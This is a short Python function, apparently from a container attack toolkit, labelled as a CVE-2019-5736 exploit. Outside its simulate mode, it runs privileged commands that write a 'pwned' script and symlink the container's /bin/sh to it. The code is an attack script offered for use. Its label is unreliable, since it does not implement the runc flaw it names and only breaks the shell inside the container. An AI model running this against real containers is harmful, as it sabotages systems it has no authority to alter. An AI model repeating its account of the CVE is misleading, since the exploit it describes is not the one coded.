def run(container, simulate=False):
    print("[*] Running CVE-2019-5736 exploit...")

    if simulate:
        print(f"[SIMULATE] Would overwrite /bin/sh with a malicious script in container '{container.name}'")
        return "Simulated run: no actual overwrite performed."

    try:
        # ✅ Write one line at a time
        container.exec_run("sh -c 'echo \"#!/bin/bash\" > /tmp/pwned_shell.sh'", privileged=True)
        container.exec_run("sh -c 'echo \"echo pwned\" >> /tmp/pwned_shell.sh'", privileged=True)
        container.exec_run("chmod +x /tmp/pwned_shell.sh", privileged=True)
        container.exec_run("ln -sf /tmp/pwned_shell.sh /bin/sh", privileged=True)

        print("[+] Exploit payload delivered. /bin/sh now points to /tmp/pwned_shell.sh")
        return "Success: /bin/sh replaced"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
